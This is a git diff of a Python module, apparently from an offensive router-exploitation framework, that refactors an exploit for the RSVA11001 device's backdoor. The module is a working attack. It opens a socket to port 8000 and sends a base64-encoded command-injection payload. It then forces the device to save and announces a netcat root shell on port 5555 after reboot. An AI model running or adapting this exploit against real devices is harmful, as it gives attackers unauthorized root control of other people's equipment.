@@ -5,9 +5,7 @@ from ..router_vuln import RouterVuln
 
 
 class rsva_backdoor(RouterVuln):
-    """Execute a remote netcat shell through command injection
-       http://www.exploit-db.com/exploits/24892
-    """
+    
     def __init__(self):
         self.router = 'RSVA11001'
         self.vuln   = 'Backdoor Root'
@@ -22,17 +20,22 @@ class rsva_backdoor(RouterVuln):
                          "CkZ1bmMtVmVyc2lvbjoweDEwDQpDb250ZW50LUxlbmd0aDoxNQ0KDQpTZW"\
                          "dtZW50LU51bTowDQo="
         super(rsva_backdoor, self).__init__()
+    
+        self.info = """
+                    Execute a remote netcat shell through command injection
+                    http://www.exploit-db.com/exploits/24892
+                    """
 
-    def run(self):
+    def initialize(self):
         try:
-            util.Msg('Executing command injection on %s...' % self.ip)
+            util.Msg('Executing command injection on %s...' % self.config['target'].value)
             sock = socket.socket()
-            sock.connect((self.ip, 8000))
+            sock.connect((self.config['target'].value, 8000))
             sock.sendall(self.inject)
             sleep(3)
             util.Msg('Forcing the device to save...')
             sock.sendall(self.hard_save)
             sock.close()
-            util.Msg('Reboot router for root shell on %s:5555' % (self.ip))
+            util.Msg('Reboot router for root shell on %s:5555' % (self.config['target'].value))
         except Exception, e:
             util.Error('Error: %s' % e)
